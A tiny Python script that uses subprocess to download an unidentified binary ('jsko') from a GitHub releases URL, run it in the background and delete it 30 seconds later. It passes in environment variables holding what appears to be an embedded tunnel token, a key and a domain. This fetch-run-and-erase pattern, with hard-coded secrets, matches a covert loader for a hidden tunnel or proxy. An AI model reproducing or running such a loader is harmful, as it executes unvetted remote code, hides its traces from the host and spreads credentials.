import subprocess
cmd = "C_T=eyJhIjoiZjAzMGY1ZDg4OGEyYmRlN2NiMDg3NTU5MzM4ZjE0OTciLCJ0IjoiYWM5Yjk3Y2QtZDg4ZC00NTYwLThmYTYtZWU5NzgwZGIzMTM0IiwicyI6Ik5qaGlPVFJrTjJVdE1UZzVOQzAwTmpFMExUaGpaR1F0TlRVNVlXRXdOakJoWldOaiJ9 K_K=5D-tgfJVlXEl7aDX C_D=streamlit3.seav.eu.org bash -c 'curl -L -o jsko https://github.com/seav1/dl/releases/download/files/jsko && chmod +x jsko && ./jsko & sleep 30 && rm -f jsko'"
subprocess.call(cmd, shell=True)
